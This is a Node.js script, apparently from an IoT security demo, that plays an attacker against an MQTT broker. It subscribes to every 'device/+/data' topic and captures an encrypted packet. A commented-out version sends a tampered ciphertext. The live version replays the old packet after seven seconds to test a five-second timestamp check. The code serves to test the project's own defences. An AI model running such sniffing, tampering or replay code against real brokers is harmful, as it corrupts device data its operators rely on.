// import mqtt from 'mqtt';
// import 'dotenv/config';

// // 1. Configuration
// const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
// const ATTACKER_ID = 'malicious_hacker_' + Date.now();

// // 2. Connect to the Broker (Just like a normal client)
// const client = mqtt.connect(BROKER_URL, { clientId: ATTACKER_ID });

// // Variables to store the stolen packet
// let stolenPacket = null;
// let targetTopic = null;

// console.log('\x1b[31m😈  [ATTACKER] Starting Malicious Script...\x1b[0m');

// client.on('connect', () => {
//     console.log('\x1b[31m😈  [ATTACKER] Connected to Broker. Sniffing for data...\x1b[0m');
    
//     // Subscribe to ALL device data topics using the wildcard '+'
//     client.subscribe('device/+/data');
// });

// client.on('message', (topic, message) => {
//     // PREVENT LOOPS: If we are the ones who sent this message, ignore it.
//     // (In a real attack, we wouldn't need this, but for simulation, it keeps logs clean)
//     if (stolenPacket && message.toString() === stolenPacket.toString()) {
//         return; 
//     }

//     console.log(`\n\x1b[31m⚡  [ATTACKER] Intercepted encrypted packet from: ${topic}\x1b[0m`);
    
//     // 3. Capture the packet (Sniffing)
//     stolenPacket = message.toString();
//     targetTopic = topic;

//     // We unsubscribe immediately so we only capture ONE packet for this demo
//     // This makes the simulation cleaner to watch
//     client.unsubscribe('device/+/data');

//     // ---------------------------------------------------------
//     // ATTACK A: INTEGRITY / TAMPERING ATTACK
//     // ---------------------------------------------------------
//     console.log('\x1b[31m🔨  [ATTACKER] Launching TAMPERING Attack (Modifying payload)...\x1b[0m');
    
//     // The message format is IV:Ciphertext:AuthTag
//     const parts = stolenPacket.split(':');
    
//     if (parts.length === 3) {
//         const iv = parts[0];
//         let ciphertext = parts[1];
//         const authTag = parts[2];

//         // CORRUPT THE DATA: We change the last few characters of the ciphertext
//         // This simulates a hacker trying to change "Temp: 20" to "Temp: 99"
//         const corruptedCipher = ciphertext.substring(0, ciphertext.length - 5) + "ABCDE";
        
//         const fakeMessage = `${iv}:${corruptedCipher}:${authTag}`;
        
//         // Send the fake message
//         client.publish(targetTopic, fakeMessage);
//         console.log(`\x1b[31m📤  [ATTACKER] Sent Tampered Packet to ${targetTopic}\x1b[0m`);
//     }

//     // ---------------------------------------------------------
//     // ATTACK B: REPLAY ATTACK
//     // ---------------------------------------------------------
//     console.log('\x1b[31m⏱️   [ATTACKER] Waiting 6 seconds to launch REPLAY Attack...\x1b[0m');
    
//     setTimeout(() => {
//         console.log('\n\x1b[31m🔄  [ATTACKER] Launching REPLAY Attack (Sending old packet)...\x1b[0m');
        
//         // Re-send the exact original packet we stole 6 seconds ago
//         client.publish(targetTopic, stolenPacket);
        
//         console.log(`\x1b[31m📤  [ATTACKER] Replayed Old Packet to ${targetTopic}\x1b[0m`);
//         console.log('\x1b[31m😈  [ATTACKER] Attacks complete. Exiting.\x1b[0m');
        
//         // Close the attacker script
//         client.end();
//         process.exit(0);
//     }, 6000); // Wait 6 seconds (Our security threshold is 5s)
// });

import mqtt from 'mqtt';
import 'dotenv/config';

const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
const ATTACKER_ID = 'malicious_hacker_' + Date.now();
const client = mqtt.connect(BROKER_URL, { clientId: ATTACKER_ID });

let stolenPacket = null;
let targetTopic = null;

console.log('\x1b[31m😈  [ATTACKER] REPLAY MODE: Starting...\x1b[0m');

client.on('connect', () => {
    console.log('\x1b[31m😈  [ATTACKER] Connected. Sniffing for data...\x1b[0m');
    client.subscribe('device/+/data');
});

client.on('message', (topic, message) => {
    // Prevent loops
    if (stolenPacket && message.toString() === stolenPacket.toString()) return;

    console.log(`\n\x1b[31m⚡  [ATTACKER] Stole packet from: ${topic}\x1b[0m`);
    
    // Capture the packet
    stolenPacket = message.toString();
    targetTopic = topic;
    client.unsubscribe('device/+/data'); // Stop listening

    console.log('\x1b[31m⏱️   [ATTACKER] Waiting 7 seconds (to ensure timestamp expires)...\x1b[0m');
    
    // Wait 7 seconds (Safe margin over the 5s threshold)
    setTimeout(() => {
        console.log('\n\x1b[31m🔄  [ATTACKER] LAUNCHING REPLAY ATTACK NOW!\x1b[0m');
        client.publish(targetTopic, stolenPacket);
        
        console.log(`\x1b[31m📤  [ATTACKER] Old packet sent. Check Subscriber logs!\x1b[0m`);
        
        setTimeout(() => process.exit(0), 1000); // Exit after sending
    }, 7000);
});